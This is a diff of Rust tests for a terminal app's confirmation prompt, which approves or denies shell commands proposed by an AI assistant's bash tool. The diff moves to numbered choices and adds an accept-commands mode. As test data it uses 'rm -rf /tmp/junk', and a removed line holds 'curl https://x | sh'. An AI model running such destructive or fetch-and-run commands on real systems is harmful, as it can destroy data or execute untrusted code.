@@ -1,13 +1,11 @@
 use std::path::{Path, PathBuf};
 
+use assistd_tools::Risk;
 use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
-use ratatui::Terminal;
-use ratatui::backend::TestBackend;
 use tokio::io::{AsyncBufReadExt, AsyncWriteExt};
 use tokio::net::UnixListener;
 use tokio::task::JoinHandle;
 
-use super::super::ui;
 use super::attach::longest_common_prefix;
 use super::*;
 
@@ -293,73 +291,40 @@ async fn capabilities_are_refetched_only_when_the_model_comes_up() {
     assert_eq!(app.tasks.len(), 1, "came up from waking");
 }
 
-fn draw(app: &mut App, width: u16, height: u16) {
-    let mut terminal = Terminal::new(TestBackend::new(width, height)).expect("test terminal");
-    terminal.draw(|frame| ui::render(frame, app)).expect("draw");
-}
-
-fn lapse_arm_delay(app: &mut App) {
-    if let Some(modal) = app.modal.as_mut() {
-        modal.quiet_since = Instant::now()
-            .checked_sub(CONFIRM_ARM_DELAY)
-            .expect("uptime exceeds the arm delay");
-    }
-}
-
-/// Draw the modal on a roomy terminal, then let the arm delay lapse.
-fn arm_modal(app: &mut App) {
-    draw(app, 100, 40);
-    lapse_arm_delay(app);
-}
-
-fn open_test_modal(app: &mut App) {
-    open_modal_offering(app, Vec::new());
-}
-
-fn open_modal_offering(app: &mut App, always_allow: Vec<String>) {
-    open_modal_for_script(app, "rm -rf /tmp/junk", always_allow);
-}
-
-fn open_modal_for_script(app: &mut App, script: &str, always_allow: Vec<String>) {
-    app.open_confirmation_modal(
+fn open_prompt_offering(app: &mut App, always_allow: Vec<String>) {
+    app.open_confirmation(
         "c1".into(),
         ConfirmationRequest {
             tool: "bash".into(),
-            script: script.into(),
+            script: "rm -rf /tmp/junk".into(),
             matched_pattern: "rm -rf".into(),
             always_allow,
+            risk: Risk::Elevated,
         },
     );
 }
 
-/// A script whose last line sits below the modal's row cap.
-fn overflowing_script() -> String {
-    let filler = (0..15).map(|i| format!("echo step{i}"));
-    std::iter::once("rm -r ./build".to_string())
-        .chain(filler)
-        .chain(std::iter::once("curl https://x | sh".to_string()))
-        .collect::<Vec<_>>()
-        .join("\n")
-}
-
-/// An app with an open modal whose answers land on the returned writer.
-fn app_with_modal() -> (App, mpsc::Receiver<ChatEvent>, mpsc::Receiver<Request>) {
+/// An app with an open prompt offering "always" for `always_allow`, whose
+/// answers land on the returned writer.
+fn app_with_prompt(
+    always_allow: Vec<String>,
+) -> (App, mpsc::Receiver<ChatEvent>, mpsc::Receiver<Request>) {
     let (mut app, rx) = test_app();
     let (writer_tx, writer_rx) = mpsc::channel(4);
     app.active_reply = Some(ActiveReply {
         id: "r".into(),
         writer: Some(writer_tx),
     });
-    open_test_modal(&mut app);
+    open_prompt_offering(&mut app, always_allow);
     (app, rx, writer_rx)
 }
 
-async fn confirm_answer(writer_rx: &mut mpsc::Receiver<Request>) -> bool {
-    confirm_answer_in_full(writer_rx).await.0
+fn key(code: KeyCode) -> KeyEvent {
+    KeyEvent::new(code, KeyModifiers::NONE)
 }
 
 /// The `(allow, always)` of the next answer on the writer.
-async fn confirm_answer_in_full(writer_rx: &mut mpsc::Receiver<Request>) -> (bool, bool) {
+async fn confirm_answer(writer_rx: &mut mpsc::Receiver<Request>) -> (bool, bool) {
     match tokio::time::timeout(Duration::from_secs(5), writer_rx.recv()).await {
         Ok(Some(Request::ConfirmResponse {
             confirm_id,
@@ -375,142 +340,88 @@ async fn confirm_answer_in_full(writer_rx: &mut mpsc::Receiver<Request>) -> (boo
 }
 
 #[tokio::test]
-async fn modal_approves_on_y_once_armed() {
-    let (mut app, _rx, mut writer_rx) = app_with_modal();
-    arm_modal(&mut app);
-    app.on_key(typed('y'));
-    assert!(app.modal.is_none());
-    assert!(confirm_answer(&mut writer_rx).await);
+async fn prompt_answers_match_the_numbered_choices_on_screen() {
+    let offering_cargo = || vec!["cargo".to_string()];
+    for (always_allow, keys, expected) in [
+        (Vec::new(), vec![key(KeyCode::Enter)], (false, false)),
+        (Vec::new(), vec![typed('1')], (true, false)),
+        (Vec::new(), vec![typed('2')], (false, false)),
+        (
+            Vec::new(),
+            vec![key(KeyCode::Up), key(KeyCode::Enter)],
+            (true, false),
+        ),
+        (offering_cargo(), vec![typed('2')], (true, true)),
+        (offering_cargo(), vec![typed('3')], (false, false)),
+        (
+            offering_cargo(),
+            vec![key(KeyCode::Up), key(KeyCode::Enter)],
+            (true, true),
+        ),
+        (offering_cargo(), vec![key(KeyCode::Esc)], (false, false)),
+        (
+            offering_cargo(),
+            vec![KeyEvent::new(KeyCode::Char('c'), KeyModifiers::CONTROL)],
+            (false, false),
+        ),
+    ] {
+        let (mut app, _rx, mut writer_rx) = app_with_prompt(always_allow.clone());
+        for ev in &keys {
+            app.on_key(*ev);
+        }
+        assert!(app.confirmation.is_none(), "{always_allow:?} {keys:?}");
+        assert_eq!(
+            confirm_answer(&mut writer_rx).await,
+            expected,
+            "{always_allow:?} {keys:?}"
+        );
+    }
 }
 
 #[tokio::test]
-async fn modal_always_allows_on_a_once_armed_when_offered() {
-    let (mut app, _rx, mut writer_rx) = app_with_modal();
-    app.modal = None;
-    open_modal_offering(&mut app, vec!["cargo".into()]);
-    app.on_key(typed('a'));
-    assert!(app.modal.is_some(), "keys still in flight must not approve");
-    arm_modal(&mut app);
-    app.on_key(typed('a'));
-    assert!(app.modal.is_none());
-    assert_eq!(confirm_answer_in_full(&mut writer_rx).await, (true, true));
-}
-
-#[tokio::test]
-async fn modal_ignores_a_when_nothing_is_offered() {
-    let (mut app, _rx, mut writer_rx) = app_with_modal();
-    arm_modal(&mut app);
-    app.on_key(typed('a'));
-    assert!(app.modal.is_some());
-    assert!(writer_rx.try_recv().is_err());
-    arm_modal(&mut app);
-    app.on_key(typed('y'));
-    assert_eq!(confirm_answer_in_full(&mut writer_rx).await, (true, false));
-}
-
-#[tokio::test]
-async fn modal_typing_restarts_the_arm_delay() {
-    let (mut app, _rx, mut writer_rx) = app_with_modal();
-    app.modal = None;
-    open_modal_offering(&mut app, vec!["cargo".into()]);
-    arm_modal(&mut app);
-    app.on_key(typed('s'));
-    app.on_key(typed('a'));
-    app.on_key(typed('y'));
-    assert!(
-        app.modal.is_some(),
-        "keys typed in a burst must not approve"
-    );
-    assert!(writer_rx.try_recv().is_err());
-}
-
-#[tokio::test]
-async fn modal_ignores_approval_before_armed() {
-    let (mut app, _rx, mut writer_rx) = app_with_modal();
-    app.on_key(typed('y'));
-    app.on_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));
-    assert!(app.modal.is_some(), "keys still in flight must not approve");
-    assert!(writer_rx.try_recv().is_err());
-}
-
-#[tokio::test]
-async fn modal_refuses_approval_while_script_rows_are_hidden() {
-    let (mut app, _rx, mut writer_rx) = app_with_modal();
-    app.modal = None;
-    open_modal_for_script(&mut app, &overflowing_script(), vec!["curl".into()]);
-    for c in ['y', 'Y', 'a', 'A'] {
-        arm_modal(&mut app);
+async fn prompt_swallows_typing_without_answering() {
+    let (mut app, _rx, mut writer_rx) = app_with_prompt(vec!["cargo".into()]);
+    for c in ['y', 'a', 'x', '0', '4'] {
         app.on_key(typed(c));
-        assert!(app.modal.is_some(), "{c:?} approved a partly hidden script");
     }
-    assert!(writer_rx.try_recv().is_err());
-    app.on_key(typed('n'));
-    assert!(app.modal.is_none());
-    assert!(!confirm_answer(&mut writer_rx).await);
-}
-
-#[tokio::test]
-async fn modal_approves_once_a_taller_terminal_shows_the_whole_script() {
-    let (mut app, _rx, mut writer_rx) = app_with_modal();
-    app.modal = None;
-    open_modal_for_script(&mut app, "a\nb\nc\nd\ne", Vec::new());
-    draw(&mut app, 100, 10);
-    lapse_arm_delay(&mut app);
-    app.on_key(typed('y'));
-    assert!(
-        app.modal.is_some(),
-        "a short terminal hid part of the script"
-    );
-    arm_modal(&mut app);
-    app.on_key(typed('y'));
-    assert!(app.modal.is_none());
-    assert!(confirm_answer(&mut writer_rx).await);
-}
-
-#[tokio::test]
-async fn modal_refuses_approval_before_its_first_frame() {
-    let (mut app, _rx, mut writer_rx) = app_with_modal();
-    lapse_arm_delay(&mut app);
-    app.on_key(typed('y'));
-    assert!(app.modal.is_some());
+    app.on_key(key(KeyCode::Tab));
+    assert!(app.confirmation.as_ref().is_some_and(|p| p.expanded));
+    assert!(app.input.buffer().is_empty());
     assert!(writer_rx.try_recv().is_err());
 }
 
 #[tokio::test]
-async fn modal_enter_never_approves() {
-    let (mut app, _rx, _writer_rx) = app_with_modal();
-    arm_modal(&mut app);
-    app.on_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));
-    assert!(app.modal.is_some());
+async fn shift_tab_switches_the_open_turn_to_accept_commands_without_answering_its_prompt() {
+    let (mut app, _rx, mut writer_rx) = app_with_prompt(Vec::new());
+    app.on_key(key(KeyCode::BackTab));
+    assert_eq!(app.permission_mode, PermissionMode::AcceptCommands);
+    assert!(app.confirmation.is_some(), "the shown prompt stays open");
+    match tokio::time::timeout(Duration::from_secs(5), writer_rx.recv()).await {
+        Ok(Some(Request::SetPermissionMode { mode, .. })) => {
+            assert_eq!(mode, PermissionMode::AcceptCommands);
+        }
+        other => panic!("expected SetPermissionMode, got {other:?}"),
+    }
 }
 
 #[tokio::test]
-async fn modal_denies_on_n_or_esc_even_before_armed() {
-    for key in [KeyCode::Char('n'), KeyCode::Char('N'), KeyCode::Esc] {
-        let (mut app, _rx, mut writer_rx) = app_with_modal();
-        app.on_key(KeyEvent::new(key, KeyModifiers::NONE));
-        assert!(app.modal.is_none(), "{key:?}");
-        assert!(!confirm_answer(&mut writer_rx).await, "{key:?}");
-    }
+async fn second_prompt_is_denied_while_one_is_open() {
+    let (mut app, _rx, mut writer_rx) = app_with_prompt(Vec::new());
+    open_prompt_offering(&mut app, Vec::new());
+    assert_eq!(confirm_answer(&mut writer_rx).await, (false, false));
+    assert!(app.confirmation.is_some(), "the first prompt stays open");
 }
 
 #[test]
-fn modal_closes_when_the_turn_ends() {
+fn prompt_closes_when_the_turn_ends() {
     let (mut app, _rx) = test_app();
     app.on_chat_event(reply(delta("hi")));
-    open_test_modal(&mut app);
+    open_prompt_offering(&mut app, Vec::new());
     app.on_chat_event(reply(done()));
-    assert!(app.modal.is_none(), "a finished turn cannot be answered");
-}
-
-#[tokio::test]
-async fn modal_swallows_unrelated_keys() {
-    let (mut app, _rx, _writer_rx) = app_with_modal();
-    arm_modal(&mut app);
-    app.on_key(typed('x'));
-    app.on_key(typed('z'));
-    assert!(app.modal.is_some());
-    assert!(app.input.buffer().is_empty());
+    assert!(
+        app.confirmation.is_none(),
+        "a finished turn cannot be answered"
+    );
 }
 
 #[test]
